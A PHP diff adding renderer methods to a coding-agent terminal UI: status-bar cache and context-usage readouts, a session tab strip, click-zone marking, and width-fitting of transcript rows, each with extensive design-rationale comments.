+     * arithmetic alone — there is nothing to clamp here, and a second clamp
+     * would only hide a broken sum.
+     *
+     * One measured caveat to that honesty: a bucket trio whose sum passes
+     * `PHP_INT_MAX` DOES break it — {@see Usage::promptTokens()} then returns
+     * a float against its `?int` and the `TypeError` thrown out of
+     * `renderStatusBar()` costs the whole frame (MEASURED at review-1:
+     * 4.6e18 × 3 fatals, 1e18 × 3 does not) — but per-call buckets — and
+     * even the turn-merged ones this path actually reads (`Usage::sum()` at
+     * `EngineBackend::complete()`, `Runtime`'s stream) — sit orders below
+     * that, so the honest guard belongs inside
+     * {@see Usage::promptTokens()} itself; recorded here, escalated by the
+     * lead, deliberately not clamped here.
+     *
+     * WHY THE NEWEST USABLE REPORT rather than a session aggregate: the two
+     * numbers must describe the SAME call (one domain, not a session average
+     * quoted beside one call's timestamp), and a session mean blends the cold
+     * first write in forever while a mid-session invalidator hides underneath
+     * it — the exact regression this readout exists to notice. An older entry
+     * is only used because the newer ones said nothing yet.
+     *
+     * WHY EACH GUARD, each one pinned by a test:
+     *  - `promptTokens()` null: an unreported bucket is not a zero —
+     *    {@see Usage}'s "Zero is not the same as unknown" — so the entry
+     *    carries no honest rate and the walk moves to the next older one.
+     *    Every pre-split provider answer arrives this way.
+     *  - THE ONE EXCEPTION (step 0.13-b): creation unreported while read and
+     *    input are both reported is the OpenAI-shaped wire (sglang, custom),
+     *    whose protocol has no cache-write field to report. Its input is
+     *    already the uncached remainder, so the share is
+     *    `cacheReadTokens / (cacheReadTokens + inputTokens)` — still two
+     *    MEASURED buckets, nothing invented. An SGLang server started without
+     *    `--enable-cache-report` reports no `cached_tokens`, so read stays
+     *    null and the segment stays absent, which is correct.
+     *  - `promptTokens() === 0`: a prompt of exactly zero measured tokens has
+     *    no cache share; displaying 0% would assert a miss the provider never
+     *    counted. Skip, as for unreported.
+     *  - age clamped at 0: a clock that steps backwards (NTP) must not paint a
+     *    negative age; zero is the truthful floor.
+     *  - `hitPercent === 0` from REPORTED buckets renders: a measured total
+     *    miss is the Phase-3/Phase-10 regression signal — suppressing it
+     *    would hide exactly what the step set out to surface.
+     *
+     * The age is printed, never compared against a TTL: prompt_expand.md
+     * §4.16's 5-minute/1-hour windows are Claude Code's product configuration
+     * for Anthropic's cache, not a bound this deployment's provider promises
+     * (an SGLang radix cache expires differently again), so colouring the
+     * readout by an assumed window would assert an expiry nobody reported.
+     *
+     * Like {@see spendIndicator()} this may vanish entirely — down to no
+     * segment at all — rather than overflow the one line the bar must never
+     * wrap; unlike it, nothing here prints on an UNREPORTED figure. $room is
+     * the columns the seniors on the row have left; forms are tried
+     * widest-first.
+     */
+    private static function cacheIndicator(Chat $chat, int $room, ?float $now = null): string
+    {
+        $read = null;
+        $age = null;
+
+        // Reverse walk, first carrier wins — see the docblock's "newest
+        // usable report" reasoning. array_reverse copies the list; a history
+        // long enough to make that cost columns the terminal does not have is
+        // a history that has already compacted (see Chat's context tiers).
+        foreach (array_reverse($chat->history) as $message) {
+            $usage = $message->usage;
+            if ($usage === null) {
+                continue;
+            }
+
+            $prompt = $usage->promptTokens();
+            // Step 0.13-b: an OpenAI-shaped provider (sglang, custom) has no
+            // cache-WRITE field at all, so creation is unreported on every
+            // answer and promptTokens() refuses forever. Read and input are
+            // still both MEASURED there — its input is prompt minus the
+            // cached share — so the share is read / (read + input). Only
+            // when creation is unreported; a reported creation keeps the
+            // three-bucket identity above, and promptTokens() itself is left
+            // alone because calibration reads it.
+            if ($prompt === null
+                && $usage->cacheCreationTokens === null
+                && $usage->cacheReadTokens !== null
+                && $usage->inputTokens !== null
+            ) {
+                $prompt = $usage->cacheReadTokens + $usage->inputTokens;
+            }
+            if ($prompt === null || $prompt <= 0) {
+                continue;
+            }
+
+            // A non-null $prompt is exactly the guard that says cacheReadTokens
+            // was reported (by both branches above).
+            $read = (int) round($usage->cacheReadTokens / $prompt * 100);
+            $age = max(0, (int) floor(($now ?? microtime(true)) - $message->createdAt));
+
+            break;
+        }
+
+        if ($read === null || $age === null) {
+            return '';
+        }
+
+        $ageText = self::formatCacheAge($age);
+        $forms = [
+            Lang::t('tui.status.cache_age', ['percent' => $read, 'age' => $ageText]),
+            Lang::t('tui.status.cache', ['percent' => $read]),
+        ];
+
+        foreach ($forms as $form) {
+            if (Width::of($form) <= $room) {
+                return $form;
+            }
+        }
+
+        return '';
+    }
+
+    /**
+     * A cache age in the coarse one-word form the bar has room for: seconds
+     * while the readout is fresh enough to say them, then minutes, hours,
+     * days. Flooring is deliberate — an age rounded UP would announce an
+     * expiry a second early, and the number reads as an age, not a countdown.
+     */
+    private static function formatCacheAge(int $seconds): string
+    {
+        if ($seconds < 60) {
+            return $seconds . 's';
+        }
+
+        if ($seconds < 3600) {
+            return intdiv($seconds, 60) . 'm';
+        }
+
+        if ($seconds < 86400) {
+            return intdiv($seconds, 3600) . 'h';
+        }
+
+        return intdiv($seconds, 86400) . 'd';
+    }
+
+    /**
+     * The status bar's context-usage readout: an absolute token count in K
+     * alongside the percentage, because a bare "37%" is unactionable unless
+     * the user already knows the budget by heart.
+     *
+     * Both numbers come from Chat ({@see Chat::contextTokens()} /
+     * {@see Chat::contextTokenLimit()}) rather than being re-derived from the
+     * percentage — the renderer must not hardcode a budget Chat resolves.
+     *
+     * The pair still carries a leading `~`, but for a narrower reason than it
+     * used to: since crush_code.md Phase 5 item 4 the limit IS the model's
+     * advertised context window whenever the backend can report one, so it is
+     * no longer "not the provider's window". The count on the left of the
+     * slash is what stays an approximation — a script-weighted character proxy
+     * ({@see \SugarCraft\Code\Util\TokenEstimate}), not a tokenizer count —
+     * which also means the percentage between two units that do not
+     * quite match. Labelling it is the honest option; printing "12.4K"
+     * unqualified would read as a figure the provider reported.
+     *
+     * A backend with no model behind it (echo, a shelled-out command) reports
+     * no window - {@see \SugarCraft\Code\Providers\EchoProvider} answers 0
+     * for "unknown" precisely so it does not become the denominator - and the
+     * limit shown is then
+     * {@see \SugarCraft\Code\Context\ContextWindow::FALLBACK_TOKENS}, the
+     * same 100,000 this bar showed before any real window was reachable. That
+     * is the figure the default offline run displays, and the reason it is
+     * unchanged there.
+     *
+     * $room is the columns the rest of the bar leaves. Forms are tried
+     * widest-first and the bare percentage is always emitted as a last
+     * resort: the bar may not wrap (see {@see renderStatusBar()}), but
+     * dropping the readout outright would leave a narrow terminal with no
+     * context signal at all.
+     */
+    private static function contextIndicator(Chat $chat, int $room): string
+    {
+        $percent = (int) round($chat->contextUsagePercent() * 100);
+        $used = self::formatTokenCount($chat->contextTokens());
+        $limit = self::formatTokenCount($chat->contextTokenLimit());
+
+        // Roadmap 3.B-4 (DCP §13.2 H, `ctx 38% (−52K pruned)`): what the
+        // session's ledger takes out of what the model is sent — prunes and
+        // compressed sections — beside the figure for the rows themselves.
+        // Read from the runner's memory copy, never the store.
+        $freed = $chat->contextLedgerView()?->freedTokens() ?? 0;
+        $pruned = $freed > 0 ? '−' . self::formatTokenCount($freed) : '';
+
+        $figures = ['used' => $used, 'limit' => $limit, 'percent' => $percent, 'pruned' => $pruned];
+        $forms = $pruned === '' ? [
+            Lang::t('tui.status.context_full', $figures),
+            "~{$used}/{$limit} ({$percent}%)",
+            Lang::t('tui.status.context_percent', $figures),
+        ] : [
+            Lang::t('tui.status.context_full_pruned', $figures),
+            Lang::t('tui.status.context_compact_pruned', $figures),
+            "~{$used}/{$limit} ({$percent}%)",
+            "{$percent}% ({$pruned})",
+            Lang::t('tui.status.context_percent', $figures),
+        ];
+        foreach ($forms as $form) {
+            if (Width::of($form) <= $room) {
+                return $form;
+            }
+        }
+
+        return "{$percent}%";
+    }
+
+    /**
+     * A token count as the compact "12.4K" the one-line status bar has room
+     * for. A round value loses its ".0" so a whole budget reads "100K"
+     * rather than the noisier "100.0K".
+     */
+    private static function formatTokenCount(int $tokens): string
+    {
+        // Always K below a million — the bar's `~0K / 100K` reads as one
+        // unit — and the shared spelling above it, so a 1M window is "1M",
+        // not "1000K".
+        if ($tokens >= 999_950) {
+            return TokenCount::compact($tokens);
+        }
+
+        $thousands = number_format($tokens / 1000, 1, '.', '');
+
+        return rtrim(rtrim($thousands, '0'), '.') . 'K';
+    }
+
+    /**
+     * "How far back am I?" readout, shown only while the transcript is
+     * scrolled off the bottom (crush_feat.md §8 E4's scrollbar-during-scroll).
+     *
+     * A fixed-height frame has no spare column for crush's real scrollbar
+     * gutter, and the frame is clipped to the terminal anyway, so the
+     * position is reported as text on the status bar the frame already
+     * reserves. It hides on the state that matters — being back at the
+     * newest line — rather than on a timer: the offset persists until the
+     * user scrolls back down, so a timed hide would blank the only clue
+     * that the newest output is off-screen while it still is.
+     *
+     * Reads {@see maxScrollOffset()} rather than recomputing: this runs
+     * inside {@see render()}, AFTER the window slice recorded this frame's
+     * own overflow.
+     *
+     * Returns the candidate forms widest-first so {@see renderStatusBar()} can
+     * take the most informative one the row still has room for; an empty list
+     * means "not scrolled, draw nothing".
+     *
+     * @return list<string>
+     */
+    private static function scrollIndicators(Chat $chat): array
+    {
+        $max = self::maxScrollOffset();
+        $offset = max(0, min($chat->scrollOffset(), $max));
+        if ($offset === 0) {
+            return [];
+        }
+
+        // The compact fallback keeps the number that actually matters — how
+        // far back the window is — when the full "of how many" readout would
+        // not fit. Losing the readout entirely on a narrow terminal would
+        // leave no clue at all that the newest output is off-screen.
+        return ['↑ ' . Lang::t('tui.status.scrolled', ['offset' => $offset, 'max' => $max]) . ' · ', "↑{$offset} "];
+    }
+
+    /**
+     * Render the agent status line + agent list pane, or '' when Chat has
+     * no AgentManager or the manager has no active agents. See the "R20
+     * wiring decision" note on this class's docblock for why AgentOutputPane
+     * / the split-pane renderer are not called here; the elapsed/token/cost
+     * columns are real as of W3.S5b — see {@see \SugarCraft\Code\Tui\Components\AgentDashboardPane::managerEntries()}.
+     *
+     * This is the in-transcript strip. The full-pane dashboard the same data
+     * feeds is {@see \SugarCraft\Code\Tui\Components\AgentDashboardPane},
+     * reached through the shell's `Pane::Agents`.
+     */
+    private static function renderAgentView(Chat $chat): string
+    {
+        $manager = $chat->agentManager();
+        if ($manager === null) {
+            return '';
+        }
+
+        // The dashboard's own rows — one per run, so a batch of Task calls
+        // of one roster agent is listed whole here too, not as one line.
+        $states = AgentDashboardPane::managerEntries($manager);
+        if ($states === []) {
+            return '';
+        }
+
+        $cols = $chat->cols();
+        // `render()` is handed a CONTENT width and draws its border and
+        // padding outside it, so the 4 that comes off here is that chrome and
+        // nothing else -- named now, because the dashboard's copy of this
+        // arithmetic subtracted 2 and was wrong by exactly the padding.
+        // The 40 floor is unchanged and still costs what it always did: under
+        // 44 columns the floor wins and the strip wants more cells than the
+        // terminal has. What E54 closes is that this used to be left to the
+        // HOSTED clipWidth() alone, and the standalone path has no hosted
+        // clip - the 44-cell rows escaped the fitter straight toward the
+        // terminal. The block is now cut to $cols here by the same guard the
+        // overlays use (below the E47 comment in renderView()), so both paths
+        // reach the terminal holding the one-row-one-line invariant, and the
+        // cut-vs-wrap trade is made once in clipRowsToCols(), not per caller.
+        $width = AgentViewPane::contentWidth($cols, 40);
+
+        // The status bar's first row is this pane's header, so it carries the
+        // `pane:agents` click zone (crush_feat.md §8 E3) — clicking it runs
+        // the same /agents dispatch Ctrl+A does. See {@see markPaneHeader()}
+        // for why the whole block is not marked, and clipRowsToCols() for why
+        // the clip runs BEFORE the mark (a cut must never split a sentinel).
+        $theme = $chat->theme();
+
+        return self::markPaneHeader(
+            Pane::Agents,
+            self::clipRowsToCols(
+                AgentStatusBar::render($states, $theme)
+                . "\n" . AgentViewPane::render($states, -1, $width, self::AGENT_VIEW_MAX_ROWS, $theme),
+                $cols,
+            ),
+        );
+    }
+
+    /**
+     * Render a one-line session tab strip from real {@see Chat::sessionStore()}
+     * rows, with the current session bracketed. Returns '' when there is no
+     * session store or fewer than 2 sessions exist — a single session isn't
+     * worth a tab strip, and {@see Chat}'s Ctrl+Tab handler is itself a no-op
+     * below 2 sessions (see `Chat::cycleSessionTab()`). See the "R20 wiring
+     * decision" note on this class's docblock for why `Tui\SessionTabs`
+     * itself is not instantiated to build this strip.
+     *
+     * The strip is prepended above the shell, outside every clip, so it has
+     * to hold its own two invariants (audit 15b-18):
+     *
+     * - ONE row no wider than `$chat->cols()`. sugar-core repaints with an
+     *   absolute `cursorTo()`, so a row the terminal soft-wraps paints every
+     *   row below it one line low, and {@see transcriptTextRegion()} counts
+     *   the strip's lines to find the shell. Each name is capped at
+     *   {@see SESSION_TAB_NAME_COLS}; the current tab is placed first and cut
+     *   further if it alone would not fit; the remaining tabs are added in
+     *   list order while they fit, and the rest collapse into `… +N`.
+     * - No terminal markup from a name. Names are free text from `/rename`
+     *   and from every other writer of the shared session.db, so each goes
+     *   through {@see sessionTabName()} before it is measured.
+     *
+     * Zones are marked per visible tab only, after layout, so no zone is
+     * ever cut and a hidden tab registers nothing to click.
+     */
+    private static function renderSessionTabStrip(Chat $chat): string
+    {
+        $store = $chat->sessionStore();
+        if ($store === null) {
+            return '';
+        }
+
+        $rows = $store->listSessions();
+        if (count($rows) < 2) {
+            return '';
+        }
+        // P-A4: pinned sessions lead the strip, as they lead the picker; the
+        // store's recency order is kept within each half (usort is stable).
+        usort($rows, static fn (array $a, array $b): int => (int) !empty($b['pinned']) <=> (int) !empty($a['pinned']));
+        $editor = $chat->titleEditor();
+
+        $cols = max(1, $chat->cols());
+        $current = $chat->currentSessionId();
+        $currentIndex = null;
+        /** @var list<array{id: string, name: string, current: bool}> $tabs */
+        $tabs = [];
+        foreach ($rows as $row) {
+            $id = (string) ($row['id'] ?? '');
+            $name = self::sessionTabName((string) ($row['name'] ?? ''));
+            if ($name === '') {
+                $name = self::sessionTabName($id);
+            }
+            $isCurrent = $id !== '' && $id === $current;
+            if ($isCurrent) {
+                $currentIndex = count($tabs);
+                // P-A4: while the inline title editor is open the current tab
+                // shows the draft as it is typed, so the user sees which tab
+                // they are naming; the editor row above the input is where
+                // the cursor lives.
+                if ($editor !== null) {
+                    $name = '✎ ' . self::sessionTabName($editor->value);
+                }
+            }
+            if (!empty($row['pinned'])) {
+                $name = '★ ' . $name;
+            }
+            $tabs[] = [
+                'id' => $id,
+                'name' => self::clipWithEllipsis($name, self::SESSION_TAB_NAME_COLS),
+                'current' => $isCurrent,
+            ];
+        }
+
+        $count = count($tabs);
+        $visible = range(0, $count - 1);
+        if (self::sessionTabsWidth($tabs, $visible) > $cols) {
+            // Room for "|… +N" at the widest N this strip can need.
+            $reserve = 1 + Width::string('… +' . ($count - 1));
+            // With no current session (a fresh launch has none selected) the
+            // first tab is the anchor, which is what plain left-to-right
+            // filling would have kept anyway.
+            $anchor = $currentIndex ?? 0;
+            $tabs[$anchor]['name'] = self::clipWithEllipsis(
+                $tabs[$anchor]['name'],
+                $cols - $reserve - 2,
+            );
+
+            $used = self::sessionTabWidth($tabs[$anchor]) + $reserve;
+            $visible = [$anchor];
+            for ($i = 0; $i < $count; $i++) {
+                if ($i === $anchor) {
+                    continue;
+                }
+                $cost = self::sessionTabWidth($tabs[$i]) + 1;
+                if ($used + $cost > $cols) {
+                    break;
+                }
+                $used += $cost;
+                $visible[] = $i;
+            }
+            sort($visible);
+        }
+
+        $labels = [];
+        foreach ($visible as $i) {
+            $tab = $tabs[$i];
+            $label = $tab['current'] ? "[{$tab['name']}]" : " {$tab['name']} ";
+            $labels[] = self::markSessionTab($tab['id'], $label);
+        }
+        $hidden = $count - count($visible);
+        if ($hidden > 0) {
+            $labels[] = '… +' . $hidden;
+        }
+        $strip = implode('|', $labels);
+
+        // Backstop for terminals too narrow for even the current tab and the
+        // marker (under ~8 columns). Cut with the zones removed, as
+        // fitStatusBar() does, so a cut can never leave half a sentinel pair.
+        $plain = self::stripZoneMarkers($strip);
+
+        return Width::string($plain) > $cols ? Width::truncate($plain, $cols) : $strip;
+    }
+
+    /**
+     * A session name (or id) as inert single-row text: escape sequences and
+     * control bytes removed, CR/LF/TAB runs folded to one space, and every
+     * Private-Use code point dropped so a name cannot forge a click zone
+     * (U+E000/U+E001) or an image marker (U+E002 up) in the frame. The same
+     * boundary the sidebars use ({@see PaneLabel::safe()}), on top of the
+     * renderer's CR-to-LF display mapping.
+     */
+    private static function sessionTabName(string $raw): string
+    {
+        return PaneLabel::safe(Sanitize::untrustedForDisplay($raw));
+    }
+
+    /**
+     * $name cut to $budget cells, ending in an ellipsis when it was cut.
+     * Grapheme-aware ({@see Width::truncate()}), so a wide or combining
+     * cluster is never split. A budget under one cell yields the empty string.
+     *
+     * The file's one shared ellipsising clip — session tabs and, since the
+     * CL-2 pane auto-dock made the agent-composer ghost overrun a docked
+     * pane's text column, {@see renderInput()}'s ghost too.
+     */
+    private static function clipWithEllipsis(string $name, int $budget): string
+    {
+        if (Width::string($name) <= $budget) {
+            return $name;
+        }
+        if ($budget <= 1) {
+            return $budget === 1 ? '…' : '';
+        }
+
+        return rtrim(Width::truncate($name, $budget - 1)) . '…';
+    }
+
+    /** @param array{id: string, name: string, current: bool} $tab */
+    private static function sessionTabWidth(array $tab): int
+    {
+        // Two cells of chrome either way: "[name]" or " name ".
+        return Width::string($tab['name']) + 2;
+    }
+
+    /**
+     * @param list<array{id: string, name: string, current: bool}> $tabs
+     * @param list<int> $indices
+     */
+    private static function sessionTabsWidth(array $tabs, array $indices): int
+    {
+        $width = max(0, count($indices) - 1);
+        foreach ($indices as $i) {
+            $width += self::sessionTabWidth($tabs[$i]);
+        }
+
+        return $width;
+    }
+
+    /**
+     * Wrap one session tab label in a `tab:<id>` click zone (crush_feat.md
+     * §8 E2), so the cells it lands on can be turned back into the session
+     * they belong to by {@see Chat::update()}.
+     *
+     * Only the label is marked, never the `|` separators: a click on the gap
+     * between two tabs is ambiguous, and leaving it unmarked makes it a no-op
+     * rather than a coin flip.
+     *
+     * Marking is skipped entirely when clicks are off. That is not just an
+     * optimisation of a dead feature: with no marker anywhere in the frame,
+     * {@see scanRoot()} keeps its `str_contains()` fast path and skips the
+     * ~24ms grapheme walk, so disabling the mouse also buys back the render
+     * cost of supporting it.
+     */
+    private static function markSessionTab(string $id, string $label): string
+    {
+        $zoneId = self::SESSION_TAB_ZONE_PREFIX . $id;
+
+        if (
+            $id === ''
+            || !Chat::mouseClicksEnabled()
+            || preg_match(self::ZONE_ID_CHARSET, $id) !== 1
+            || strlen($zoneId) > Mark::MAX_ID_BYTES
+        ) {
+            return $label;
+        }
+
+        return Mark::zone($zoneId, $label);
+    }
+
+    /**
+     * Wrap one on-screen region in a `pane:<name>` click zone (crush_feat.md
+     * §8 E3), so a click on it can be turned back into the {@see Pane} it
+     * belongs to by {@see Chat::update()}.
+     *
+     * No id validation here, unlike {@see markSessionTab()}: a pane id is a
+     * `Pane` case's own `value` (a lowercase ASCII literal in the enum), not
+     * a string that arrived from disk, so it cannot fall outside
+     * {@see Mark}'s charset and make `Mark::wrap()` throw inside `view()`.
+     *
+     * Marking is skipped when clicks are off, for the reason spelled out on
+     * {@see markSessionTab()}: with no marker anywhere in the frame
+     * {@see scanRoot()} keeps its `str_contains()` fast path.
+     *
+     * @param string $content MUST be a single line — see {@see markPaneHeader()}.
+     */
+    private static function markPane(Pane $pane, string $content): string
+    {
+        if ($content === '' || !Chat::mouseClicksEnabled()) {
+            return $content;
+        }
+
+        return Mark::zone(self::PANE_ZONE_PREFIX . $pane->value, $content);
+    }
+
+    /**
+     * Remember that $label's row should become a `toolcall:<key>` click zone
+     * (crush_feat.md §8 E5). Called as the transcript is built; the actual
+     * {@see Mark::zone()} happens later in {@see markToolCalls()}, for the
+     * layout reason documented on {@see $toolCallZones}.
+     *
+     * $key is validated the way {@see markSessionTab()} validates a session
+     * id, and for the same reason: it is `ToolResult::$id`, which is whatever
+     * the provider (ultimately the model) put in the tool call, so an id
+     * carrying anything outside {@see Mark}'s charset would throw from inside
+     * `view()` and take the TUI down. An unmarkable row simply stays
+     * unclickable — Ctrl+O still expands it.
+     *
+     * A key already recorded this frame is skipped rather than recorded
+     * twice: duplicate ids make {@see \SugarCraft\Mouse\Scan::parse()} throw,
+     * and {@see scanRoot()} answers a throw by clearing the registry, which
+     * would cost the whole frame its zones. Keys collide when a result has no
+     * id and shares its name with an earlier one — those two rows already
+     * share a single expanded-state entry, so only one of them could have
+     * shown an independent result anyway.
+     */
+    private static function recordToolCallZone(string $key, string $label): void
+    {
+        $zoneId = self::TOOL_CALL_ZONE_PREFIX . $key;
+
+        if (
+            $key === ''
+            || !Chat::mouseClicksEnabled()
+            || preg_match(self::ZONE_ID_CHARSET, $key) !== 1
+            || strlen($zoneId) > Mark::MAX_ID_BYTES
+        ) {
+            return;
+        }
+
+        // Keyed by id so the first-wins check is a lookup. A scan here made
+        // the frame quadratic in the number of tool calls (audit 15b-10).
+        if (isset(self::$toolCallZones[$key])) {
+            return;
+        }
+
+        self::$toolCallZones[$key] = ['id' => $key, 'label' => $label];
+    }
+
+    /**
+     * Turn each row recorded by {@see recordToolCallZone()} into a click zone
+     * on the already-bordered, already-padded shell (crush_feat.md §8 E5).
+     *
+     * Rows are located by their label text rather than by index because the
+     * shell adds its own border/padding rows and a tool block is preceded by
+     * a variable number of transcript lines. Each shell row is claimed at
+     * most once and searching resumes from the row after the last claim, so
+     * two results that render an identical label (same tool, same status, no
+     * ids) map to the two rows in the order they were emitted instead of both
+     * resolving to the first one.
+     *
+     * The WHOLE row is wrapped, borders included: the label already spans
+     * most of it, and a click landing on the padding beside a tool row has no
+     * other meaning, so a generous target beats an exact one here. It stays a
+     * single-line zone, which is what keeps it clip-safe — see
+     * {@see markPaneHeader()} for what a multi-row zone does when
+     * {@see render()} slices the frame to the terminal's height.
+     */
+    private static function markToolCalls(string $shell): string
+    {
+        if (self::$toolCallZones === []) {
+            return $shell;
+        }
+
+        $lines = explode("\n", $shell);
+        $from  = 0;
+        foreach (self::$toolCallZones as $zone) {
+            for ($i = $from, $n = count($lines); $i < $n; $i++) {
+                if (str_contains($lines[$i], $zone['label'])) {
+                    $lines[$i] = Mark::zone(self::TOOL_CALL_ZONE_PREFIX . $zone['id'], $lines[$i]);
+                    $from      = $i + 1;
+
+                    break;
+                }
+            }
+        }
+
+        return implode("\n", $lines);
+    }
+
+    /**
+     * Mark only the FIRST line of a multi-line block as the pane's zone —
+     * its header row, which is the "title/border region" §8 E3 asks for.
+     *
+     * Deliberately not the whole block. {@see render()} clips `$content` to
+     * the terminal's height by dropping leading LINES, so a zone spanning
+     * several rows can lose its opening sentinel while the closing one
+     * survives. {@see \SugarCraft\Mouse\Scan::parse()} skips that orphan
+     * close and registers NO zone for it (sugar-mouse's malformed-markup
+     * matrix: lenient by design, because viewport clipping is exactly how an
+     * orphan arises) — so the pane's surviving rows would silently stop
+     * answering clicks. A single-line zone is clipped whole or not at all,
+     * so it is either fully clickable or absent, never half-registered.
+     */
+    private static function markPaneHeader(Pane $pane, string $block): string
+    {
+        $lines = explode("\n", $block);
+        $lines[0] = self::markPane($pane, $lines[0]);
+
+        return implode("\n", $lines);
+    }
+
+    /**
+     * Hold every row of the transcript to $width display cells, wrapping the
+     * ones that overflow.
+     *
+     * This is the invariant half of the width fix, and it exists because
+     * threading the width into SugarMarkdown is NOT sufficient. `withWordWrap()`
+     * wraps paragraphs, blockquotes and list items and deliberately leaves
+     * code blocks and tables alone ("they have their own width semantics" —
+     * `SugarCraft\Markdown\Renderer::withWordWrap()`), and a fenced code block
+     * carrying a 150-column line is ordinary output for a coding agent. So the
+     * pane width has to be enforced over the finished bytes as well as
+     * requested of the producer.
+     *
+     * Why this matters is the same reason {@see renderDiff()} truncates and
+     * {@see renderStatusBar()} fits rather than wraps: sugar-core's `Renderer`
+     * repaints rows with an ABSOLUTE `cursorTo($row, 1)`, so one logical line
+     * per physical row is a hard invariant. An over-wide row is soft-wrapped
+     * by the TERMINAL, every row after it slides down, and the repaint lands
+     * on stale coordinates — the shape of the "text ends up in the status bar"
+     * class of bug. On the hosted shell path the same over-wide row instead
+     * hits `ChatPane`'s `Style::width()`, which truncates (sugar-style
+     * truncates for `width()`, it does not wrap), so the reply is silently cut
+     * off mid-sentence — the reported symptom.
+     *
+     * WRAP, not truncate. {@see Width::wrapAnsi()} is what SugarMarkdown itself
+     * wraps with, it is ANSI-aware, and it preserves the content. Truncating
+     * the body of a reply deletes the thing the user is trying to read;
+     * {@see renderDiff()} and {@see toolCallSuffix()} truncate because a
+     * horizontal cut reads naturally on a diff row and on a trailing command
+     * echo, which is not true of prose or of a code line. Where the wrap
+     * cannot deliver the bound, {@see hardFit()} is the backstop and the cut
+     * is deliberate — a bound that is provably false is worse than a visible
+     * cut, because the whole frame below an over-wide row is painted at the
+     * wrong coordinates.
+     *
+     * Two rows are exempt, for reasons that are not cosmetic:
+     *
+     * - Rows that already fit keep their VISIBLE bytes untouched (only
+     *   {@see balanceSgr()} may add zero-width SGR/OSC to them, and only when
+     *   the row inherits or leaves an open state). BYTE-identical, and that is
+     *   a real branch rather than a shortcut around
+     *   `Width::truncateAnsi($row, $width)`: `Width::of()` measures
+     *   `Ansi::strip($row)`, which consumes a TWO-BYTE escape ending in an
+     *   ECMA-48 Fe final (0x40-0x5f — ESC-backslash, `ESC P`, `ESC M`) as zero
+     *   cells, while `truncateAnsi()`'s scanner passes through `ESC [` and
+     *   `ESC ]` only and so reads that second byte as one VISIBLE cell. Ten
+     *   `a` + ESC-backslash pairs measure 10 cells here and come back from
+     *   `truncateAnsi(…, 10)` as 5 — half the row deleted on the one path
+     *   whose contract is to touch nothing. Nothing delivers such a row today
+     *   (measured: assistant prose, a fence, inline code, a user message and a
+     *   diff body all arrive with the escape already scrubbed), so the branch
+     *   is pinned where it is decided, by
+     *   PaneWidthInvariantTest::testTheFitterPassesAFittingRowThroughUntouchedWhereTruncateAnsiWouldCutIt().
+     *   That same pass-through is what keeps the pixel-graphics markers safe:
+     *   `ImageOverlay::markerBlock()` emits a marker cell plus padding at
+     *   `max(1, min(IMAGE_COLS, $width))` cells,
+     *   which is `$width` itself on any terminal of 46 columns or fewer — i.e.
+     *   the marker row sits exactly ON this `<=` boundary rather than
+     *   comfortably inside it. Take the wrap branch there and
+     *   `Width::wrapAnsi()`'s `rtrim()` deletes the reserved cells outright
+     *   (measured at cols=46: 92 bytes and 46 cells intact, 72 bytes and 26
+     *   cells once the fast path is lost), so the boundary is a `<=` on
+     *   purpose and is swept at 26/34/46 by
+     *   PaneWidthInvariantTest::testAnImageMarkerRowSurvivesTheFitterAtTheBoundaryWidths().
+     *   Identifying marker rows by their leading Private-Use codepoint would be
+     *   WRONG here — U+E000 is also {@see \SugarCraft\Mouse\Sentinel::OPEN},
+     *   and a model reply can contain any PUA codepoint it likes.
+     * - A tool-call row is TRUNCATED rather than wrapped. Its whole row is a
+     *   single-line click zone that {@see markToolCalls()} locates by
+     *   `str_contains()` on the recorded label; wrapping would split the label
+     *   across two rows (losing the zone) and turn a deliberately single-line
+     *   zone into a multi-row one, which {@see markPaneHeader()} documents as
+     *   the way an orphaned sentinel reaches `Scan::parse()` and silently
+     *   costs that zone its clickability.
+     *
+     * No zone sentinel can be split by this: every {@see \SugarCraft\Mouse\Mark}
+     * caller in this class runs LATER than the one call site
+     * ({@see renderView()}), and the untrusted paths strip bare sentinels out
+     * of model text before it ever reaches here.
+     */
+    private static function fitToPane(string $block, int $width): string
+    {
+        if ($width <= 0 || $block === '') {
+            return $block;
+        }
+
+        $out = [];
+        foreach (explode("\n", $block) as $row) {
+            if (Width::of($row) <= $width) {
+                $out[] = $row;
+
+                continue;
+            }
+            if (self::isToolCallRow($row)) {
+                $out[] = self::hardFit($row, $width);
+
+                continue;
+            }
+            foreach (self::wrapToPane($row, $width) as $piece) {
+                $out[] = $piece;
+            }
+        }
+
+        // Over the WHOLE block, not per over-wide row, and this is a fix for a
+        // regression the width thread-through introduced: now that SugarMarkdown
+        // wraps, most wrapping happens inside SugarMarkdown and its rows arrive
+        // here already fitting, so they take the fast path above and used to
+        // reach the terminal exactly as SugarMarkdown left them — unbalanced.
+        // Measured at cols=60, a bold clause spanning a SugarMarkdown wrap opened
+        // `ESC[1m` on its first row and closed it nowhere: the border glyph
+        // inherited the bold and the continuation row rendered plain. Carrying
+        // one SgrState across every row of the block is what fixes both that
+        // and the wrap this method does itself.
+        return implode("\n", self::balanceSgr($out));
+    }
+
+    /**
+     * Wrap one over-wide row into pieces each of which is at most $width cells
+     * AS MEASURED BY {@see Width::of()} — the instrument the invariant is
+     * stated in, and the reason this is not a one-line call to
+     * {@see Width::wrapAnsi()}.
+     *
+     * ✅ THE CLUSTER DISAGREEMENT THIS PARAGRAPH DESCRIBED IS FIXED — in
+     * sugar-core, in round 40 (2026-08-22), as backlog E68. It is rewritten
+     * rather than deleted because the branch below still exists, and a reader
+     * who finds a guard with its stated reason removed will delete the guard.
+     *
+     * WHAT IT SAID. sugar-core measured cell width two ways that disagreed on
+     * grapheme clusters: `Width::of()` split with `grapheme_str_split()` where
+     * it existed and fell back to ONE CODEPOINT PER CLUSTER where it did not
+     * (PHP < 8.4 without that intl function — this repo's baseline is 8.3),
+     * while `wrapAnsi()`/`truncateAnsi()` walked their own `nextCluster()`
+     * scanner, which DOES join a modifier or a regional-indicator pair. The
+     * measured consequence was a factor of two in both directions: 40 flags at
+     * cols=40 produced 9 rows up to 74 cells wide, and 80 skin-tone thumbs at
+     * cols=100 produced rows of 194, with the wrap reporting success.
+     *
+     * WHAT IS TRUE NOW. `Width` has ONE segmentation on every PHP version —
+     * `graphemes()` walks ICU through `grapheme_extract()`, and `sugar-core`
+     * declares `ext-intl` to make that a guarantee rather than a hope. MEASURED
+     * on PHP 8.3.6, before -> after the fix: a skin-toned thumb scores
+     * `Width::of` 4 -> 2, and a regional-indicator flag was 2 and stays 2. The
+     * two accountings agree on clusters.
